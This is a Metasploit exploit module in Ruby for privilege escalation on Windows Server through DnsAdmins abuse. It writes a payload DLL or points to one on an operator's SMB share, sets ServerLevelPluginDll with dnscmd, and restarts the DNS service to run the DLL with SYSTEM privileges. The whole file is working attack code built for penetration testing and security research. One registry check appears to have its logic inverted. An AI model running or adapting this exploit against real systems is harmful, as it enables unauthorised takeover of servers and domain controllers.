##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = GreatRanking

  include Msf::Exploit::EXE
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Services

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'DnsAdmin ServerLevelPluginDLL Feature Abuse Privilege Escalation',
      'Description'    => %q(
        This module exploits a feature in the DNS service of Windows Server. Users of the DnsAdmins group can set the
        ServerLevelPluginDll value using dnscmd.exe to create a registry key at HKLM\SYSTEM\CurrentControlSet\services\DNS\Parameters\
        named ServerLevelPluginDll that can be made to point to an arbitrary DLL. After doing so, restarting the service will load the DLL
        and cause it to execute, providing us with SYSTEM privileges. Using the Metasploit-generated DLL will cause the service to become
        unresponsive, and will require removing the registry key and rebooting to get it working again.
      ),
      'References'     =>
        [
          ['URL', 'https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83'],
          ['URL', 'https://adsecurity.org/?p=4064'],
          ['URL', 'http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html']
        ],
      'DisclosureDate' => "May 08 2017",
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Shay Ber', # vulnerability discovery
          'Imran E. Dawoodjee <imran[at]threathounds.com>' # Metasploit module
        ],
      'Platform'       => 'win',
      'Targets'        => [['Automatic', {}]],
      'SessionTypes'   => [ 'meterpreter' ],
      'DefaultOptions' => { 'WfsDelay' => 10 })
    )

    register_options(
      [
        OptString.new('DLLNAME', [ false, 'DLL name (default: msf.dll)', "msf.dll"]),
        OptString.new('DLLPATH', [ false, 'Path to DLL. Can be a UNC path. (default: %TEMP%)', "%TEMP%"])
      ]
    )

    deregister_options('FILE_CONTENTS')
  end

  def check
    username = client.sys.config.getuid
    user_sid = client.sys.config.getsid
    hostname = sysinfo['Computer']
    print_status("Running check against #{hostname} as user #{username}...")

    srv_info = service_info("DNS")
    if srv_info.nil?
      print_bad("Unable to enumerate the DNS service!")
      return Exploit::CheckCode::Unknown
    end

    if srv_info && srv_info[:display].empty?
      print_bad("The DNS service does not exist on this host!")
      return Exploit::CheckCode::Safe
    end

    # for use during permission check
    dacl_items = srv_info[:dacl].split("D:")[1].split("(")
    dacl_items.each do |dacl_item|
      dacl_item.delete_suffix!(")")
    end

    print_good("DNS service found on #{hostname}.")

    # user must be a member of the DnsAdmins group to be able to change ServerLevelPluginDll
    group_membership = get_whoami
    unless group_membership
      print_bad("Unable to enumerate group membership!")
      return Exploit::CheckCode::Unknown
    end

    unless group_membership.include? "DnsAdmins"
      print_bad("User #{username} is not part of the DnsAdmins group!")
      return Exploit::CheckCode::Safe
    end


    # find the DnsAdmins group SID
    dnsadmin_sid = ""
    group_membership.split("\n").each do |line|
      unless line.include? "DnsAdmins"
        next
      end

      print_good("User #{username} is part of the DnsAdmins group.")
      line.split.each do |item|
        unless item.include? "S-"
          next
        end

        vprint_status("DnsAdmins SID is #{item}")
        dnsadmin_sid = item
        break
      end
      break
    end

    # check if the user or DnsAdmins group has the proper permissions to start/stop the DNS service
    if dacl_items.any? { |dacl_item| dacl_item.include? dnsadmin_sid }
      dnsadmin_dacl = dacl_items.select { |dacl_item| dacl_item.include? dnsadmin_sid }[0]
      if dnsadmin_dacl.include? "RPWP"
        print_good("Members of the DnsAdmins group can start/stop the DNS service.")
      end
    elsif dacl_items.any? { |dacl_item| dacl_item.include? user_sid }
      user_dacl = dacl_items.select { |dacl_item| dacl_item.include? user_sid }[0]
      if user_dacl.include? "RPWP"
        print_good("User #{username} can start/stop the DNS service.")
      end
    else
      print_bad("User #{username} does not have permissions to start/stop the DNS service!")
      return Exploit::CheckCode::Safe
    end

    Exploit::CheckCode::Vulnerable
  end

  def exploit
    if sysinfo['Architecture'] != payload_instance.arch.first
      fail_with(Failure::BadConfig, "Wrong payload architecture!")
    end

    unless [CheckCode::Vulnerable].include? check
      fail_with Failure::NotVulnerable, "Target is most likely not vulnerable!"
    end

    # if the DNS service is not started, it will throw RPC_S_SERVER_UNAVAILABLE when trying to set ServerLevelPluginDll
    print_status("Checking service state...")
    svc_state = service_status("DNS")
    if svc_state[:state] == 4
      print_status("DNS service is running, proceeding...")
    else
      print_status("DNS service is stopped, starting it...")
      service_start("DNS")
    end

    # the if block assumes several things:
    # 1. operator has set up their own SMB share (SMB2 is default for most targets)
    # 2. operator has generated their own DLL with the correct payload and architecture
    # 3. operator's SMB share is accessible from the target. "Enable insecure guest logons" is "Enabled" on the target or
    #    the target falls back to SMB1
    dllpath = expand_path("#{datastore['DLLPATH']}\\#{datastore['DLLNAME']}").strip
    if datastore['DLLPATH'].start_with?("\\\\")
      # check if "Enable insecure guest logons" is enabled on the target system
      allow_insecure_guest_auth = registry_getvaldata("HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters", "AllowInsecureGuestAuth")
      if allow_insecure_guest_auth == 1
        fail_with Failure::BadConfig, "'Enable insecure guest logons' is not set to Enabled on the target system!"
      end

      print_status("Using user-provided UNC path.")
    else
      print_status("Creating the payload DLL (#{sysinfo['Architecture']})...")
      opts = {}
      opts[:arch] = [sysinfo['Architecture']]
      dll = generate_payload_dll(opts)

      print_status("Writing DLL to #{dllpath}...")
      write_file(dllpath, dll)
    end

    print_status("Modifying ServerLevelPluginDll to point to #{dllpath}...")
    dnscmd_result = cmd_exec("cmd.exe /c dnscmd \\\\#{sysinfo['Computer']} /config /serverlevelplugindll #{dllpath}").strip
    if dnscmd_result.include? "success"
      print_good(dnscmd_result.split("\n")[0])
      print_status("Restarting the DNS service...")
      service_stop("DNS")
      service_start("DNS")
    else
      fail_with Failure::UnexpectedReply, dnscmd_result.split("\n")[0]
    end
  end
end
